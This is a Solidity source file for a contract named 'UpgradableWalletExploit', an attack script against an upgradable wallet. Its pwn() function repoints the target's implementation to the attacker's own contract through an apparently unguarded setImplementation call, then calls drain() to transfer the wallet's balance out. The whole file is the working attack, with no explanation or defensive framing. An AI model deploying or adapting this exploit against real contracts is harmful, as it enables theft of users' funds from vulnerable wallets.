// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract UpgradableWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function _call(bytes memory data) private {
        (bool success, ) = target.call(data);
        require(success, "call failed");
    }

    function pwn() external {
        _call(abi.encodeWithSignature("setImplementation(address)", address(this)));
        _call(abi.encodeWithSignature("drain()"));
    }

    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
